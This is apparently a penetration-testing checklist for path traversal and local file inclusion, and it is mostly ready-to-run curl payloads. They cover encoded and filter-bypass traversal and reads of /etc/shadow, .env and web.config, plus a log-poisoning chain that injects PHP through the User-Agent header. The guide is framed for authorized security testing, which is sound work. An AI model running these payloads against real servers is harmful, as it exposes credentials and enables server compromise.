# Path Traversal & Local File Inclusion (LFI) Testing

## Objective

Identify inputs that are used to construct file system paths server-side, allowing an attacker to read files outside the intended directory (path traversal) or include local files in application execution (LFI).

---

## 1. Identify Vulnerable Parameters

Look for parameters that suggest file or path operations:

| Parameter Pattern | Examples |
|---|---|
| File name | `?file=`, `?filename=`, `?page=`, `?doc=` |
| Path | `?path=`, `?dir=`, `?folder=` |
| Template | `?template=`, `?view=`, `?layout=` |
| Resource | `?resource=`, `?asset=`, `?load=` |
| Language/locale | `?lang=en`, `?locale=en_US` |
| Log | `?log=`, `?logfile=` |

---

## 2. Basic Path Traversal

```bash
# Basic traversal — Unix
curl -si "https://target/download?file=../../../etc/passwd" | grep -E "root:|HTTP"
curl -si "https://target/download?file=../../../../etc/shadow" | grep -E "root:|HTTP"
curl -si "https://target/download?file=../../../etc/hosts" | grep -E "localhost|HTTP"
curl -si "https://target/download?file=../../../proc/self/environ" | grep HTTP

# Windows paths
curl -si "https://target/download?file=..\..\..\..\windows\win.ini" | grep HTTP
curl -si "https://target/download?file=../../../../boot.ini" | grep HTTP
```

---

## 3. Encoding Bypasses

If the application filters `../`, try encoded variants:

```bash
BASE="https://target/download?file="

# URL encoding
curl -si "${BASE}..%2F..%2F..%2Fetc%2Fpasswd" | grep "root:"

# Double encoding
curl -si "${BASE}..%252F..%252F..%252Fetc%252Fpasswd" | grep "root:"

# Unicode/UTF-8 encoding
curl -si "${BASE}..%c0%af..%c0%af..%c0%afetc%c0%afpasswd" | grep "root:"
curl -si "${BASE}..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd" | grep "root:"

# Null byte (old PHP behavior)
curl -si "${BASE}../../../etc/passwd%00.jpg" | grep "root:"

# Mixed separators (Windows)
curl -si "${BASE}..\/..\/..\/etc\/passwd" | grep "root:"
```

---

## 4. Filter Bypass — Stripped `../`

If the application strips `../` (naive filter):
```bash
# Double-layered traversal
curl -si "https://target/file?name=....//....//....//etc/passwd" | grep "root:"
curl -si "https://target/file?name=..././..././..././etc/passwd" | grep "root:"
curl -si "https://target/file?name=....\/....\/....\/etc/passwd" | grep "root:"
```

---

## 5. Absolute Path Injection

```bash
# Direct absolute path (if no base path is prepended)
curl -si "https://target/file?path=/etc/passwd" | grep "root:"
curl -si "https://target/file?path=/etc/shadow" | grep HTTP
curl -si "https://target/file?path=/var/log/apache2/access.log" | grep HTTP
curl -si "https://target/file?path=/proc/self/cmdline" | grep HTTP
```

---

## 6. High-Value Target Files

```bash
# Linux/Unix
FILES=(
  "/etc/passwd"
  "/etc/hosts"
  "/etc/hostname"
  "/etc/os-release"
  "/proc/self/environ"
  "/proc/self/cmdline"
  "/proc/net/tcp"
  "/var/log/apache2/access.log"
  "/var/log/nginx/access.log"
  "/var/www/html/.env"
  "/home/www/.env"
  "/app/.env"
  "/app/config/database.yml"
)

for FILE in "${FILES[@]}"; do
  TRAVERSAL="../../../..$FILE"
  echo "Testing: $FILE"
  curl -si "https://target/download?file=$TRAVERSAL" \
    --max-time 3 | grep -E "root:|DB_|SECRET|HTTP"
done
```

```bash
# Windows targets
curl -si "https://target/file?name=../../../../windows/win.ini" | grep "\[fonts\]"
curl -si "https://target/file?name=../../../../inetpub/wwwroot/web.config" | grep "connectionString"
```

---

## 7. LFI to Remote Code Execution (Sensitive Chains)

> **Rules:** Only test LFI-to-RCE via log poisoning if explicitly authorized. Do not poison production logs.

### Log Poisoning (If log file is readable)
```bash
# Step 1: Check if access log is readable via LFI
curl -si "https://target/page?view=../../../var/log/apache2/access.log" | head -20

# Step 2: Inject PHP into User-Agent (safe PoC — echo test only)
curl -si https://target/ \
  -A '<?php echo "lfi_rce_test"; ?>'

# Step 3: Include the log via LFI
curl -si "https://target/page?view=../../../var/log/apache2/access.log" | grep "lfi_rce_test"
```

### PHP Session File Inclusion
```bash
# If you can control session data and the session file is includable
SESSION_FILE="/var/lib/php/sessions/sess_$(cookie_value)"
curl -si "https://target/page?view=../../.$SESSION_FILE" | grep HTTP
```

---

## 8. Template / View File Enumeration

```bash
# Enumerate template files
for TEMPLATE in index home login dashboard admin error 404; do
  echo "Testing template: $TEMPLATE"
  curl -si "https://target/page?view=$TEMPLATE" | grep -E "HTTP|200|404"
  sleep 0.2
done

# Path traversal on view/template parameters
curl -si "https://target/page?view=../config/database" | grep -iE "host|password|db_"
```

---

## Evidence to Capture

- The vulnerable parameter and endpoint
- The traversal payload used
- The response showing file contents (first 5 lines only — blur credentials)
- HTTP status code (200 returned instead of expected 404/403)

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Basic traversal — /etc/passwd readable | Pass/Fail | High |
| Encoded bypass to traverse | Pass/Fail | High |
| .env / config file readable | Pass/Fail | Critical |
| Log file readable (LFI chain entry) | Pass/Fail | High |
| LFI → code execution (log poison) | Pass/Fail | Critical |
| Windows file readable | Pass/Fail | High |
